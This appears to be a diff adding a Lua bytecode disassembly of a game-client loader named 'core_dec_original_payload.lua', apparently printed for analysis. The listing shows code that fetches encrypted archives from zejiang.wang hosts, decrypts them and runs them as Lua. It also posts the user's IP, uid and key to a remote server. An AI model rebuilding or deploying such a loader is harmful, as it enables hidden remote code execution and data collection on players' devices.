\228\190\174\232\190\177\230\136\150\232\128\133\232\175\189\232\176\164\228\187\150\228\186\186\239\188\140\228\190\181\229\174\179\228\187\150\228\186\186\229\144\136\230\179\149\230\157\131\231\155\138\231\154\132\239\188\155\n        (9) \229\144\171\230\156\137\230\179\149\229\190\139\227\128\129\232\161\140\230\148\191\230\179\149\232\167\132\231\166\129\230\173\162\231\154\132\229\133\182\228\187\150\229\134\133\229\174\185\231\154\132\228\191\161\230\129\175\227\128\130\n        \228\186\140\227\128\129\230\156\172\230\184\184\230\136\143\230\137\128\230\156\137\231\180\160\230\157\144\229\157\135\230\157\165\232\135\170\228\186\146\232\129\148\231\189\145\239\188\140\229\166\130\233\129\135\228\190\181\230\157\131\232\175\183\232\129\148\231\179\187GM\229\136\160\233\153\164\227\128\130\n        \228\184\137\227\128\129\232\139\165\230\130\168\229\175\185\230\156\172\230\184\184\230\136\143\229\143\138\230\156\172\230\156\141\229\138\161\230\156\137\228\187\187\228\189\149\230\132\143\232\167\129\239\188\140\230\172\162\232\191\142\232\129\148\231\179\187\230\184\184\230\136\143\231\149\140\233\157\162\228\184\173\231\154\132\229\174\162\230\156\141\232\129\148\231\179\187\230\150\185\229\188\143\227\128\130\n    "
+	5	"http://go.zejiang.wang/gv6"
+	6	"http://gate.zejiang.wang:88/gv6"
+	7	"81"
+	8	"88"
+	9	"89"
+	10	"90"
+	11	"91"
+	12	"92"
+	13	"93"
+	14	"94"
+	15	"http://tm2.zejiang.wang/gv6"
+	16	"http://tm3.zejiang.wang/gv6"
+	17	"http://sng.zejiang.wang:99/gv6"
+	18	"4"
+	19	"1"
+	20	"device"
+	21	"writablePath"
+	22	"cache/ao/"
+	23	"getinfo"
+	24	"string"
+	25	"len"
+	26	"gateIP"
+	27	"nofile"
+	28	"role"
+	29	"open"
+	30	"core_func_md5"
+	31	"stuff"
+	32	"999"
+	33	"io"
+	34	"exists"
+	35	"ycFunction"
+	36	"mkdir"
+	37	"math"
+	38	"floor"
+	39	"exp"
+	40	"sqrt"
+	41	"char"
+	42	"reverse"
+	43	"pcall"
+	44	"res/"
+	45	"format"
+	46	"core%s.zip"
+	47	"USE_ARM64"
+	48	"64"
+	49	"dcore%s.zip"
+	50	"an"
+	51	"newMsgbox"
+	52	"\228\189\160\231\154\132\231\153\187\233\153\134\229\153\168\228\184\141\230\152\175G\231\137\136\231\153\187\233\153\134\229\153\168\n\232\175\183\228\184\139\232\189\189bzmir.bin\239\188\129 "
+	53	"center"
+	54	"close"
+	55	"scheduler"
+	56	"performWithDelayGlobal"
+	57	"6"
+	58	"cc"
+	59	"Crypto"
+	60	"decryptXXTEA"
+	61	"what"
+	62	"C"
+	63	"core_func_byby"
+	64	"\233\157\158\230\179\149hook"
+	65	"readfile"
+	66	"core\231\188\186\229\164\177"
+	67	"core_func_decryptTEA"
+	68	"\231\136\178"
+	69	"core_func_writefile"
+	70	"LuaLoadChunksFromZIP"
+	71	"os"
+	72	"remove"
+	73	"hookcore%s.zip"
+	74	"set_helper"
+	75	"core_func_createNet"
+	76	"POST"
+	77	"getFileData"
+	78	"gplus.bin"
+	79	"smlt_"
+	80	"time"
+	81	"none"
+	82	"g_data"
+	83	"login"
+	84	"localLastSer"
+	85	"zonename"
+	86	"crypto"
+	87	"encodeBase64"
+	88	"setPOSTData"
+	89	"ip="
+	90	"&uid="
+	91	"&code="
+	92	"&key="
+	93	"decodeBase64"
+	94	"&version="
+	95	"&zone="
+	96	"setTimeout"
+	97	"start"
+locals (49) for <prototype-address-omitted>:
+	0	arg	1	457
+	1	k	9	457
+	2	l	10	457
+	3	m	20	457
+	4	n	26	457
+	5	o	27	457
+	6	p	30	457
+	7	q	33	457
+	8	r	38	457
+	9	s	39	457
+	10	t	41	457
+	11	u	44	457
+	12	v	45	457
+	13	w	48	457
+	14	x	49	457
+	15	y	50	457
+	16	z	56	457
+	17	A	68	457
+	18	B	83	457
+	19	D	88	457
+	20	F	94	457
+	21	J	97	457
+	22	L	106	457
+	23	P	110	457
+	24	Q	113	457
+	25	R	117	457
+	26	S	135	457
+	27	a6	152	457
+	28	a8	161	457
+	29	a9	161	457
+	30	aa	161	457
+	31	ab	167	457
+	32	ac	167	457
+	33	ad	169	457
+	34	ae	178	457
+	35	am	182	457
+	36	an	182	457
+	37	ao	187	457
+	38	ap	200	457
+	39	aq	213	457
+	40	a0	279	457
+	41	as	292	457
+	42	U	354	457
+	43	X	377	457
+	44	a0	385	457
+	45	a1	385	457
+	46	a2	387	457
+	47	a4	397	457
+	48	a5	398	457
+upvalues (6) for <prototype-address-omitted>:
+	0	h
+	1	j
+	2	d
+	3	e
+	4	f
+	5	g
+
+function <core_dec_original_payload.lua:1,1> (3 instructions, 12 bytes at <prototype-address-omitted>)
+0 params, 2 slots, 0 upvalues, 0 locals, 1 constant, 0 functions
+	1	[1]	LOADK    	0 -1	; "rM"
+	2	[1]	RETURN   	0 2
+	3	[1]	RETURN   	0 1
+constants (1) for <prototype-address-omitted>:
+	1	"rM"
+locals (0) for <prototype-address-omitted>:
+upvalues (0) for <prototype-address-omitted>:
+
+function <core_dec_original_payload.lua:1,1> (3 instructions, 12 bytes at <prototype-address-omitted>)
+0 params, 2 slots, 0 upvalues, 0 locals, 1 constant, 0 functions
+	1	[1]	LOADK    	0 -1	; "A"
+	2	[1]	RETURN   	0 2
+	3	[1]	RETURN   	0 1
+constants (1) for <prototype-address-omitted>:
+	1	"A"
+locals (0) for <prototype-address-omitted>:
+upvalues (0) for <prototype-address-omitted>:
+
+function <core_dec_original_payload.lua:1,1> (2 instructions, 8 bytes at <prototype-address-omitted>)
+1 param, 2 slots, 0 upvalues, 1 local, 0 constants, 0 functions
+	1	[1]	RETURN   	0 2
+	2	[1]	RETURN   	0 1
+constants (0) for <prototype-address-omitted>:
+locals (1) for <prototype-address-omitted>:
+	0	C	1	2
+upvalues (0) for <prototype-address-omitted>:
+
+function <core_dec_original_payload.lua:1,1> (46 instructions, 184 bytes at <prototype-address-omitted>)
+1 param, 10 slots, 4 upvalues, 1 local, 18 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; t
+	2	[1]	GETUPVAL 	2 1	; h
+	3	[1]	GETTABLE 	2 2 -1	; "cc"
+	4	[1]	GETTABLE 	2 2 -2	; "Crypto"
+	5	[1]	GETTABLE 	2 2 -3	; "decodeBase64"
+	6	[1]	CALL     	1 2 2
+	7	[1]	GETTABLE 	1 1 -4	; "what"
+	8	[1]	EQ       	0 1 -5	; - "C"
+	9	[1]	JMP      	33	; to 43
+	10	[1]	GETUPVAL 	1 1	; h
+	11	[1]	GETTABLE 	1 1 -6	; "core_func_decryptTEA"
+	12	[1]	GETUPVAL 	2 1	; h
+	13	[1]	GETTABLE 	2 2 -7	; "core_func_decodeBase64"
+	14	[1]	MOVE     	3 0
+	15	[1]	CALL     	2 2 2
+	16	[1]	GETUPVAL 	3 1	; h
+	17	[1]	GETTABLE 	3 3 -8	; "tostring"
+	18	[1]	GETUPVAL 	4 1	; h
+	19	[1]	GETTABLE 	4 4 -9	; "os"
+	20	[1]	GETTABLE 	4 4 -10	; "date"
+	21	[1]	LOADK    	5 -11	; "%Y%m"
+	22	[1]	CALL     	4 2 0
+	23	[1]	CALL     	3 0 2
+	24	[1]	GETUPVAL 	4 1	; h
+	25	[1]	GETTABLE 	4 4 -7	; "core_func_decodeBase64"
+	26	[1]	LOADK    	5 -12	; "K"
+	27	[1]	GETUPVAL 	6 2	; z
+	28	[1]	CALL     	6 1 2
+	29	[1]	LOADK    	7 -13	; "s"
+	30	[1]	GETUPVAL 	8 3	; x
+	31	[1]	CALL     	8 1 2
+	32	[1]	LOADK    	9 -14	; "oLrt"
+	33	[1]	CONCAT   	5 5 9
+	34	[1]	CALL     	4 2 2
+	35	[1]	GETUPVAL 	5 1	; h
+	36	[1]	GETTABLE 	5 5 -15	; "def"
+	37	[1]	GETTABLE 	5 5 -16	; "role"
+	38	[1]	GETTABLE 	5 5 -17	; "stuff"
+	39	[1]	CONCAT   	3 3 5
+	40	[1]	TAILCALL 	1 3 0
+	41	[1]	RETURN   	1 0
+	42	[1]	JMP      	3	; to 46
+	43	[1]	GETUPVAL 	1 1	; h
+	44	[1]	GETTABLE 	1 1 -18	; "core_func_exit"
+	45	[1]	CALL     	1 1 1
+	46	[1]	RETURN   	0 1
+constants (18) for <prototype-address-omitted>:
+	1	"cc"
+	2	"Crypto"
+	3	"decodeBase64"
+	4	"what"
+	5	"C"
+	6	"core_func_decryptTEA"
+	7	"core_func_decodeBase64"
+	8	"tostring"
+	9	"os"
+	10	"date"
+	11	"%Y%m"
+	12	"K"
+	13	"s"
+	14	"oLrt"
+	15	"def"
+	16	"role"
+	17	"stuff"
+	18	"core_func_exit"
+locals (1) for <prototype-address-omitted>:
+	0	E	1	46
+upvalues (4) for <prototype-address-omitted>:
+	0	t
+	1	h
+	2	z
+	3	x
+
+function <core_dec_original_payload.lua:1,1> (40 instructions, 160 bytes at <prototype-address-omitted>)
+2 params, 6 slots, 5 upvalues, 3 locals, 8 constants, 0 functions
+	1	[1]	GETUPVAL 	2 0	; t
+	2	[1]	GETUPVAL 	3 1	; h
+	3	[1]	GETTABLE 	3 3 -1	; "io"
+	4	[1]	GETTABLE 	3 3 -2	; "write"
+	5	[1]	CALL     	2 2 2
+	6	[1]	GETTABLE 	2 2 -3	; "what"
+	7	[1]	EQ       	0 2 -4	; - "C"
+	8	[1]	JMP      	28	; to 37
+	9	[1]	GETUPVAL 	2 1	; h
+	10	[1]	GETTABLE 	2 2 -1	; "io"
+	11	[1]	GETTABLE 	2 2 -5	; "open"
+	12	[1]	MOVE     	3 0
+	13	[1]	LOADK    	4 -6	; "w+b"
+	14	[1]	CALL     	2 3 2
+	15	[1]	TEST     	2 0 0
+	16	[1]	JMP      	17	; to 34
+	17	[1]	GETTABLE 	3 2 -2	; "write"
+	18	[1]	MOVE     	4 2
+	19	[1]	MOVE     	5 1
+	20	[1]	CALL     	3 3 2
+	21	[1]	GETUPVAL 	4 2	; f
+	22	[1]	EQ       	0 3 4
+	23	[1]	JMP      	2	; to 26
+	24	[1]	GETUPVAL 	3 3	; d
+	25	[1]	RETURN   	3 2
+	26	[1]	GETUPVAL 	3 1	; h
+	27	[1]	GETTABLE 	3 3 -1	; "io"
+	28	[1]	GETTABLE 	3 3 -7	; "close"
+	29	[1]	MOVE     	4 2
+	30	[1]	CALL     	3 2 1
+	31	[1]	GETUPVAL 	3 4	; e
+	32	[1]	RETURN   	3 2
+	33	[1]	JMP      	6	; to 40
+	34	[1]	GETUPVAL 	3 3	; d
+	35	[1]	RETURN   	3 2
+	36	[1]	JMP      	3	; to 40
+	37	[1]	GETUPVAL 	2 1	; h
+	38	[1]	GETTABLE 	2 2 -8	; "core_func_exit"
+	39	[1]	CALL     	2 1 1
+	40	[1]	RETURN   	0 1
+constants (8) for <prototype-address-omitted>:
+	1	"io"
+	2	"write"
+	3	"what"
+	4	"C"
+	5	"open"
+	6	"w+b"
+	7	"close"
+	8	"core_func_exit"
+locals (3) for <prototype-address-omitted>:
+	0	G	1	40
+	1	H	1	40
+	2	I	15	36
+upvalues (5) for <prototype-address-omitted>:
+	0	t
+	1	h
+	2	f
+	3	d
+	4	e
+
+function <core_dec_original_payload.lua:1,1> (30 instructions, 120 bytes at <prototype-address-omitted>)
+1 param, 3 slots, 2 upvalues, 1 local, 5 constants, 1 function
+	1	[1]	GETUPVAL 	1 0	; t
+	2	[1]	GETUPVAL 	2 1	; h
+	3	[1]	GETTABLE 	2 2 -1	; "pcall"
+	4	[1]	CALL     	1 2 2
+	5	[1]	GETTABLE 	1 1 -2	; "what"
+	6	[1]	EQ       	1 1 -3	; - "C"
+	7	[1]	JMP      	4	; to 12
+	8	[1]	GETUPVAL 	1 1	; h
+	9	[1]	GETTABLE 	1 1 -4	; "core_func_exit"
+	10	[1]	CALL     	1 1 1
+	11	[1]	RETURN   	0 1
+	12	[1]	GETUPVAL 	1 0	; t
+	13	[1]	GETUPVAL 	2 1	; h
+	14	[1]	GETTABLE 	2 2 -5	; "load"
+	15	[1]	CALL     	1 2 2
+	16	[1]	GETTABLE 	1 1 -2	; "what"
+	17	[1]	EQ       	0 1 -3	; - "C"
+	18	[1]	JMP      	8	; to 27
+	19	[1]	GETUPVAL 	1 1	; h
+	20	[1]	GETTABLE 	1 1 -1	; "pcall"
+	21	[1]	CLOSURE  	2 0	; <function-address-omitted>
+	22	[1]	GETUPVAL 	0 1	; h
+	23	[1]	MOVE     	0 0
+	24	[1]	TAILCALL 	1 2 0
+	25	[1]	RETURN   	1 0
+	26	[1]	JMP      	3	; to 30
+	27	[1]	GETUPVAL 	1 1	; h
+	28	[1]	GETTABLE 	1 1 -4	; "core_func_exit"
+	29	[1]	CALL     	1 1 1
+	30	[1]	RETURN   	0 1
+constants (5) for <prototype-address-omitted>:
+	1	"pcall"
+	2	"what"
+	3	"C"
+	4	"core_func_exit"
+	5	"load"
+locals (1) for <prototype-address-omitted>:
+	0	K	1	30
+upvalues (2) for <prototype-address-omitted>:
+	0	t
+	1	h
+
+function <core_dec_original_payload.lua:1,1> (6 instructions, 24 bytes at <prototype-address-omitted>)
+0 params, 2 slots, 2 upvalues, 0 locals, 1 constant, 0 functions
+	1	[1]	GETUPVAL 	0 0	; h
+	2	[1]	GETTABLE 	0 0 -1	; "load"
+	3	[1]	GETUPVAL 	1 1	; K
+	4	[1]	CALL     	0 2 2
+	5	[1]	CALL     	0 1 1
+	6	[1]	RETURN   	0 1
+constants (1) for <prototype-address-omitted>:
+	1	"load"
+locals (0) for <prototype-address-omitted>:
+upvalues (2) for <prototype-address-omitted>:
+	0	h
+	1	K
+
+function <core_dec_original_payload.lua:1,1> (47 instructions, 188 bytes at <prototype-address-omitted>)
+0 params, 5 slots, 8 upvalues, 3 locals, 8 constants, 0 functions
+	1	[1]	GETUPVAL 	0 0	; h
+	2	[1]	GETTABLE 	0 0 -1	; "isloaded"
+	3	[1]	TEST     	0 0 0
+	4	[1]	JMP      	1	; to 6
+	5	[1]	RETURN   	0 1
+	6	[1]	GETUPVAL 	0 0	; h
+	7	[1]	GETTABLE 	0 0 -2	; "io"
+	8	[1]	GETTABLE 	0 0 -3	; "exists"
+	9	[1]	GETUPVAL 	1 1	; A
+	10	[1]	LOADK    	2 -4	; ".bin"
+	11	[1]	CONCAT   	1 1 2
+	12	[1]	CALL     	0 2 2
+	13	[1]	TEST     	0 0 0
+	14	[1]	JMP      	28	; to 43
+	15	[1]	GETUPVAL 	0 0	; h
+	16	[1]	GETTABLE 	0 0 -2	; "io"
+	17	[1]	GETTABLE 	0 0 -5	; "readfile"
+	18	[1]	GETUPVAL 	1 1	; A
+	19	[1]	LOADK    	2 -4	; ".bin"
+	20	[1]	CONCAT   	1 1 2
+	21	[1]	CALL     	0 2 2
+	22	[1]	TEST     	0 0 0
+	23	[1]	JMP      	19	; to 43
+	24	[1]	GETUPVAL 	1 2	; D
+	25	[1]	MOVE     	2 0
+	26	[1]	CALL     	1 2 2
+	27	[1]	MOVE     	0 1
+	28	[1]	TEST     	0 0 0
+	29	[1]	JMP      	13	; to 43
+	30	[1]	GETUPVAL 	1 3	; J
+	31	[1]	MOVE     	2 0
+	32	[1]	CALL     	1 2 3
+	33	[1]	TEST     	1 0 0
+	34	[1]	JMP      	8	; to 43
+	35	[1]	GETUPVAL 	3 5	; e
+	36	[1]	SETUPVAL 	3 4	; v
+	37	[1]	GETUPVAL 	3 0	; h
+	38	[1]	GETTABLE 	3 3 -6	; "print"
+	39	[1]	LOADK    	4 -7	; "m1"
+	40	[1]	CALL     	3 2 1
+	41	[1]	GETUPVAL 	3 5	; e
+	42	[1]	RETURN   	3 2
+	43	[1]	LOADK    	0 -8	; "nover"
+	44	[1]	SETUPVAL 	0 6	; y
+	45	[1]	GETUPVAL 	0 7	; d
+	46	[1]	RETURN   	0 2
+	47	[1]	RETURN   	0 1
+constants (8) for <prototype-address-omitted>:
+	1	"isloaded"
+	2	"io"
+	3	"exists"
+	4	".bin"
+	5	"readfile"
+	6	"print"
+	7	"m1"
+	8	"nover"
+locals (3) for <prototype-address-omitted>:
+	0	M	22	43
+	1	N	33	43
+	2	O	33	43
+upvalues (8) for <prototype-address-omitted>:
+	0	h
+	1	A
+	2	D
+	3	J
+	4	v
+	5	e
+	6	y
+	7	d
+
+function <core_dec_original_payload.lua:1,1> (30 instructions, 120 bytes at <prototype-address-omitted>)
+0 params, 3 slots, 3 upvalues, 1 local, 5 constants, 0 functions
+	1	[1]	GETUPVAL 	0 0	; h
+	2	[1]	GETTABLE 	0 0 -1	; "io"
+	3	[1]	GETTABLE 	0 0 -2	; "exists"
+	4	[1]	GETUPVAL 	1 1	; A
+	5	[1]	LOADK    	2 -3	; ".bin"
+	6	[1]	CONCAT   	1 1 2
+	7	[1]	CALL     	0 2 2
+	8	[1]	TEST     	0 0 0
+	9	[1]	JMP      	20	; to 30
+	10	[1]	GETUPVAL 	0 0	; h
+	11	[1]	GETTABLE 	0 0 -1	; "io"
+	12	[1]	GETTABLE 	0 0 -2	; "exists"
+	13	[1]	GETUPVAL 	1 1	; A
+	14	[1]	LOADK    	2 -4	; ".version"
+	15	[1]	CONCAT   	1 1 2
+	16	[1]	CALL     	0 2 2
+	17	[1]	TEST     	0 0 0
+	18	[1]	JMP      	11	; to 30
+	19	[1]	GETUPVAL 	0 0	; h
+	20	[1]	GETTABLE 	0 0 -1	; "io"
+	21	[1]	GETTABLE 	0 0 -5	; "readfile"
+	22	[1]	GETUPVAL 	1 1	; A
+	23	[1]	LOADK    	2 -4	; ".version"
+	24	[1]	CONCAT   	1 1 2
+	25	[1]	CALL     	0 2 2
+	26	[1]	TEST     	0 0 0
+	27	[1]	JMP      	2	; to 30
+	28	[1]	SETUPVAL 	0 2	; y
+	29	[1]	RETURN   	0 1
+	30	[1]	RETURN   	0 1
+constants (5) for <prototype-address-omitted>:
+	1	"io"
+	2	"exists"
+	3	".bin"
+	4	".version"
+	5	"readfile"
+locals (1) for <prototype-address-omitted>:
+	0	M	26	30
+upvalues (3) for <prototype-address-omitted>:
+	0	h
+	1	A
+	2	y
+
+function <core_dec_original_payload.lua:1,1> (7 instructions, 28 bytes at <prototype-address-omitted>)
+1 param, 4 slots, 2 upvalues, 1 local, 1 constant, 0 functions
+	1	[1]	GETUPVAL 	1 0	; F
+	2	[1]	GETUPVAL 	2 1	; A
+	3	[1]	LOADK    	3 -1	; ".version"
+	4	[1]	CONCAT   	2 2 3
+	5	[1]	MOVE     	3 0
+	6	[1]	CALL     	1 3 1
+	7	[1]	RETURN   	0 1
+constants (1) for <prototype-address-omitted>:
+	1	".version"
+locals (1) for <prototype-address-omitted>:
+	0	y	1	7
+upvalues (2) for <prototype-address-omitted>:
+	0	F
+	1	A
+
+function <core_dec_original_payload.lua:1,1> (11 instructions, 44 bytes at <prototype-address-omitted>)
+1 param, 4 slots, 3 upvalues, 1 local, 3 constants, 0 functions
+	1	[1]	GETUPVAL 	1 0	; F
+	2	[1]	GETUPVAL 	2 1	; A
+	3	[1]	LOADK    	3 -1	; ".bin"
+	4	[1]	CONCAT   	2 2 3
+	5	[1]	MOVE     	3 0
+	6	[1]	CALL     	1 3 1
+	7	[1]	GETUPVAL 	1 2	; h
+	8	[1]	GETTABLE 	1 1 -2	; "print"
+	9	[1]	LOADK    	2 -3	; "m2"
+	10	[1]	CALL     	1 2 1
+	11	[1]	RETURN   	0 1
+constants (3) for <prototype-address-omitted>:
+	1	".bin"
+	2	"print"
+	3	"m2"
+locals (1) for <prototype-address-omitted>:
+	0	E	1	11
+upvalues (3) for <prototype-address-omitted>:
+	0	F
+	1	A
+	2	h
+
+function <core_dec_original_payload.lua:1,1> (139 instructions, 556 bytes at <prototype-address-omitted>)
+1 param, 22 slots, 17 upvalues, 8 locals, 34 constants, 2 functions
+	1	[1]	TEST     	0 0 0
+	2	[1]	JMP      	25	; to 28
+	3	[1]	GETUPVAL 	1 0	; q
+	4	[1]	GETUPVAL 	2 1	; p
+	5	[1]	LE       	0 1 2
+	6	[1]	JMP      	11	; to 18
+	7	[1]	GETUPVAL 	1 3	; n
+	8	[1]	GETUPVAL 	2 0	; q
+	9	[1]	GETTABLE 	1 1 2
+	10	[1]	SETUPVAL 	1 2	; o
+	11	[1]	GETUPVAL 	1 0	; q
+	12	[1]	GETUPVAL 	2 4	; j
+	13	[1]	LOADK    	3 -1	; "1"
+	14	[1]	CALL     	2 2 2
+	15	[1]	ADD      	1 1 2
+	16	[1]	SETUPVAL 	1 0	; q
+	17	[1]	JMP      	10	; to 28
+	18	[1]	GETUPVAL 	1 5	; h
+	19	[1]	GETTABLE 	1 1 -2	; "def"
+	20	[1]	GETTABLE 	1 1 -3	; "debugkey"
+	21	[1]	TEST     	1 0 0
+	22	[1]	JMP      	4	; to 27
+	23	[1]	GETUPVAL 	1 5	; h
+	24	[1]	GETTABLE 	1 1 -4	; "print"
+	25	[1]	LOADK    	2 -5	; "\230\178\161\230\156\137\229\143\175\228\187\165\232\174\191\233\151\174\231\154\132\230\156\141\229\138\161\229\153\168"
+	26	[1]	CALL     	1 2 1
+	27	[1]	RETURN   	0 1
+	28	[1]	GETUPVAL 	1 6	; y
+	29	[1]	TEST     	0 0 0
+	30	[1]	JMP      	1	; to 32
+	31	[1]	LOADK    	1 -6	; "dirty"
+	32	[1]	GETUPVAL 	2 5	; h
+	33	[1]	GETTABLE 	2 2 -2	; "def"
+	34	[1]	GETTABLE 	2 2 -3	; "debugkey"
+	35	[1]	TEST     	2 0 0
+	36	[1]	JMP      	4	; to 41
+	37	[1]	GETUPVAL 	2 5	; h
+	38	[1]	GETTABLE 	2 2 -4	; "print"
+	39	[1]	GETUPVAL 	3 2	; o
+	40	[1]	CALL     	2 2 1
+	41	[1]	GETUPVAL 	2 5	; h
+	42	[1]	GETTABLE 	2 2 -7	; "core_func_createNet"
+	43	[1]	CLOSURE  	3 0	; <function-address-omitted>
+	44	[1]	GETUPVAL 	0 5	; h
+	45	[1]	GETUPVAL 	0 7	; S
+	46	[1]	MOVE     	0 0
+	47	[1]	GETUPVAL 	0 4	; j
+	48	[1]	GETUPVAL 	0 8	; L
+	49	[1]	GETUPVAL 	0 9	; e
+	50	[1]	GETUPVAL 	0 10	; D
+	51	[1]	GETUPVAL 	0 11	; J
+	52	[1]	GETUPVAL 	0 12	; R
+	53	[1]	GETUPVAL 	0 13	; Q
+	54	[1]	GETUPVAL 	4 14	; B
+	55	[1]	GETUPVAL 	5 2	; o
+	56	[1]	CALL     	4 2 2
+	57	[1]	LOADK    	5 -8	; "POST"
+	58	[1]	CALL     	2 4 2
+	59	[1]	GETUPVAL 	3 5	; h
+	60	[1]	GETTABLE 	3 3 -9	; "ycFunction"
+	61	[1]	GETTABLE 	3 3 -10	; "getFileData"
+	62	[1]	GETUPVAL 	4 5	; h
+	63	[1]	GETTABLE 	4 4 -9	; "ycFunction"
+	64	[1]	LOADK    	5 -11	; "gplus.bin"
+	65	[1]	GETUPVAL 	6 9	; e
+	66	[1]	CALL     	3 4 3
+	67	[1]	CLOSURE  	5 1	; <function-address-omitted>
+	68	[1]	GETUPVAL 	0 5	; h
+	69	[1]	LOADK    	6 -12	; "smlt_"
+	70	[1]	MOVE     	7 5
+	71	[1]	GETUPVAL 	8 15	; g
+	72	[1]	GETUPVAL 	9 5	; h
+	73	[1]	GETTABLE 	9 9 -13	; "os"
+	74	[1]	GETTABLE 	9 9 -14	; "time"
+	75	[1]	CALL     	9 1 2
+	76	[1]	CONCAT   	8 8 9
+	77	[1]	CALL     	7 2 2
+	78	[1]	CONCAT   	6 6 7
+	79	[1]	LOADK    	7 -15	; "none"
+	80	[1]	GETUPVAL 	8 5	; h
+	81	[1]	GETTABLE 	8 8 -16	; "g_data"
+	82	[1]	GETTABLE 	8 8 -17	; "login"
+	83	[1]	GETTABLE 	8 8 -18	; "localLastSer"
+	84	[1]	TEST     	8 0 0
+	85	[1]	JMP      	17	; to 103
+	86	[1]	GETUPVAL 	8 5	; h
+	87	[1]	GETTABLE 	8 8 -16	; "g_data"
+	88	[1]	GETTABLE 	8 8 -17	; "login"
+	89	[1]	GETTABLE 	8 8 -18	; "localLastSer"
+	90	[1]	GETTABLE 	8 8 -19	; "zonename"
+	91	[1]	TEST     	8 0 0
+	92	[1]	JMP      	10	; to 103
+	93	[1]	GETUPVAL 	8 5	; h
+	94	[1]	GETTABLE 	8 8 -20	; "crypto"
+	95	[1]	GETTABLE 	8 8 -21	; "encodeBase64"
+	96	[1]	GETUPVAL 	9 5	; h
+	97	[1]	GETTABLE 	9 9 -16	; "g_data"
+	98	[1]	GETTABLE 	9 9 -17	; "login"
+	99	[1]	GETTABLE 	9 9 -18	; "localLastSer"
+	100	[1]	GETTABLE 	9 9 -19	; "zonename"
+	101	[1]	CALL     	8 2 2
+	102	[1]	MOVE     	7 8
+	103	[1]	GETTABLE 	8 2 -22	; "setPOSTData"
+	104	[1]	MOVE     	9 2
+	105	[1]	LOADK    	10 -23	; "ip="
+	106	[1]	GETUPVAL 	11 5	; h
+	107	[1]	GETTABLE 	11 11 -20	; "crypto"
+	108	[1]	GETTABLE 	11 11 -21	; "encodeBase64"
+	109	[1]	GETUPVAL 	12 16	; w
+	110	[1]	CALL     	11 2 2
+	111	[1]	LOADK    	12 -24	; "&uid="
+	112	[1]	MOVE     	13 6
+	113	[1]	LOADK    	14 -25	; "&code="
+	114	[1]	MOVE     	15 4
+	115	[1]	LOADK    	16 -26	; "&key="
+	116	[1]	GETUPVAL 	17 5	; h
+	117	[1]	GETTABLE 	17 17 -20	; "crypto"
+	118	[1]	GETTABLE 	17 17 -27	; "decodeBase64"
+	119	[1]	GETUPVAL 	18 5	; h
+	120	[1]	GETTABLE 	18 18 -2	; "def"
+	121	[1]	GETTABLE 	18 18 -28	; "role"
+	122	[1]	GETTABLE 	18 18 -29	; "stuff"
+	123	[1]	CALL     	17 2 2
+	124	[1]	LOADK    	18 -30	; "&version="
+	125	[1]	MOVE     	19 1
+	126	[1]	LOADK    	20 -31	; "&zone="
+	127	[1]	MOVE     	21 7
+	128	[1]	CONCAT   	10 10 21
+	129	[1]	CALL     	8 3 1
+	130	[1]	GETTABLE 	8 2 -32	; "setTimeout"
+	131	[1]	MOVE     	9 2
+	132	[1]	GETUPVAL 	10 4	; j
+	133	[1]	LOADK    	11 -33	; "6"
+	134	[1]	CALL     	10 2 0
+	135	[1]	CALL     	8 0 1
+	136	[1]	GETTABLE 	8 2 -34	; "start"
+	137	[1]	MOVE     	9 2
+	138	[1]	CALL     	8 2 1
+	139	[1]	RETURN   	0 1
+constants (34) for <prototype-address-omitted>:
+	1	"1"
+	2	"def"
+	3	"debugkey"
+	4	"print"
+	5	"\230\178\161\230\156\137\229\143\175\228\187\165\232\174\191\233\151\174\231\154\132\230\156\141\229\138\161\229\153\168"
+	6	"dirty"
+	7	"core_func_createNet"
+	8	"POST"
+	9	"ycFunction"
+	10	"getFileData"
+	11	"gplus.bin"
+	12	"smlt_"
+	13	"os"
+	14	"time"
+	15	"none"
+	16	"g_data"
+	17	"login"
+	18	"localLastSer"
+	19	"zonename"
+	20	"crypto"
+	21	"encodeBase64"
+	22	"setPOSTData"
+	23	"ip="
+	24	"&uid="
+	25	"&code="
+	26	"&key="
+	27	"decodeBase64"
+	28	"role"
+	29	"stuff"
+	30	"&version="
+	31	"&zone="
+	32	"setTimeout"
+	33	"6"
+	34	"start"
+locals (8) for <prototype-address-omitted>:
+	0	T	1	139
+	1	U	29	139
+	2	V	59	139
+	3	a0	67	139
+	4	a1	67	139
+	5	a2	69	139
+	6	a4	79	139
+	7	a5	80	139
+upvalues (17) for <prototype-address-omitted>:
+	0	q
+	1	p
+	2	o
+	3	n
+	4	j
+	5	h
+	6	y
+	7	S
+	8	L
+	9	e
+	10	D
+	11	J
+	12	R
+	13	Q
+	14	B
+	15	g
+	16	w
+
+function <core_dec_original_payload.lua:1,1> (149 instructions, 596 bytes at <prototype-address-omitted>)
+1 param, 11 slots, 10 upvalues, 9 locals, 25 constants, 0 functions
+	1	[1]	GETTABLE 	1 0 -1	; "name"
+	2	[1]	EQ       	1 1 -2	; - "completed"
+	3	[1]	JMP      	16	; to 20
+	4	[1]	GETTABLE 	1 0 -1	; "name"
+	5	[1]	EQ       	0 1 -3	; - "failed"
+	6	[1]	JMP      	12	; to 19
+	7	[1]	GETUPVAL 	1 0	; h
+	8	[1]	GETTABLE 	1 1 -4	; "def"
+	9	[1]	GETTABLE 	1 1 -5	; "debugkey"
+	10	[1]	TEST     	1 0 0
+	11	[1]	JMP      	4	; to 16
+	12	[1]	GETUPVAL 	1 0	; h
+	13	[1]	GETTABLE 	1 1 -6	; "print"
+	14	[1]	LOADK    	2 -7	; "backup not ok"
+	15	[1]	CALL     	1 2 1
+	16	[1]	GETUPVAL 	1 1	; S
+	17	[1]	GETUPVAL 	2 2	; T
+	18	[1]	CALL     	1 2 1
+	19	[1]	RETURN   	0 1
+	20	[1]	GETTABLE 	1 0 -8	; "request"
+	21	[1]	GETTABLE 	2 1 -9	; "getResponseStatusCode"
+	22	[1]	MOVE     	3 1
+	23	[1]	CALL     	2 2 2
+	24	[1]	GETUPVAL 	3 3	; j
+	25	[1]	LOADK    	4 -10	; "200"
+	26	[1]	CALL     	3 2 2
+	27	[1]	EQ       	1 2 3
+	28	[1]	JMP      	1	; to 30
+	29	[1]	RETURN   	0 1
+	30	[1]	GETTABLE 	3 1 -11	; "getResponseData"
+	31	[1]	MOVE     	4 1
+	32	[1]	CALL     	3 2 2
+	33	[1]	TEST     	3 0 0
+	34	[1]	JMP      	111	; to 146
+	35	[1]	EQ       	0 3 -12	; - "u7bTrcq508Ow19bttcfCvMb3"
